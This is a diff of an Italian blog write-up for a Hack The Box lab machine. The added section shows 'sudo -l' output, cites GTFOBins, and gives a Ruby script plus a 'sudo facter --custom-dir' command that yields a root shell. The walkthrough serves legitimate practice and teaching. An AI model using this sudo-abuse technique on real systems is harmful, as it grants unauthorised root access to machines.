@@ -237,7 +237,7 @@
     "keywords": ["HTB","OSCP","Camaleon CMS","facter","CVE-2024-46987","Path Traversal","Abusing sudo policy"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "316"
+    "wordCount": "479"
   }]
   </script>
 
@@ -696,7 +696,7 @@
   <div class="flex flex-row flex-wrap items-center">
     
     
-      <time datetime="2025-02-04T00:00:00&#43;00:00">4 febbraio 2025</time><span class="px-2 text-primary-500">&middot;</span><span title="Tempo di lettura">2 minuti</span>
+      <time datetime="2025-02-04T00:00:00&#43;00:00">4 febbraio 2025</time><span class="px-2 text-primary-500">&middot;</span><span title="Tempo di lettura">3 minuti</span>
     
 
     
@@ -1151,7 +1151,7 @@
           <td>SSH</td>
           <td>OpenSSH</td>
           <td>9.9p1</td>
-          <td>OS: Ubuntu</td>
+          <td>Ubuntu</td>
       </tr>
       <tr>
           <td>80</td>
@@ -1229,6 +1229,23 @@
     </span>
     
 </h3>
+<p>Di seguito analizzerò la policy <code>sudo</code> assegnata all&rsquo;account <code>trivia</code>:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries for trivia on facts:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
+</span></span><span class="line"><span class="cl">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User trivia may run the following commands on facts:
+</span></span><span class="line"><span class="cl">    (ALL) NOPASSWD: /usr/bin/facter</span></span></code></pre></div></div>
+<p>L&rsquo;utente <code>triva</code> può quindi eseguire il binario <code>/usr/bin/facter</code> con privilegi qualunque (anche <code>root</code>) senza dover inserire la password dell&rsquo;utente.</p>
+<p>Da <a href="https://gtfobins.org/gtfobins/facter/"  target="_blank" rel="noreferrer">GTFOBins</a> si scopre che il binario <code>facter</code> è un binario noto e può essere abusato per elevare i propri privilegi. Infatti se questo binario viene eseguito come segue, il primo file <code>.rb</code> presente nella directory <code>/path/to/dir/</code> verrà a sua volta eseguito:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">facter --custom-dir<span class="o">=</span>/path/to/dir/ x</span></span></code></pre></div></div>
+<p>Lanciando <code>facter</code> con privilegi elevati anche il file <code>.rb</code> verrà eseguito con gli stessi privilegi. In questo modo è quindi possibile ottenere una shell come utente <code>root</code>. Creo quindi uno script Ruby con il seguente contenuto:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env ruby</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">exec</span> <span class="s1">&#39;/bin/bash -p&#39;</span></span></span></code></pre></div></div>
+<p>In seguito eseguo il binario <code>/usr/bin/facter</code> indicato nella policy con <code>sudo</code> ed ottengo così una shell come <code>root</code> sulla macchina:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">sudo /usr/bin/facter --custom-dir=/tmp x</span></span></code></pre></div></div>
 
 <h3 class="relative group">Root flag
     <div id="root-flag" class="anchor"></div>
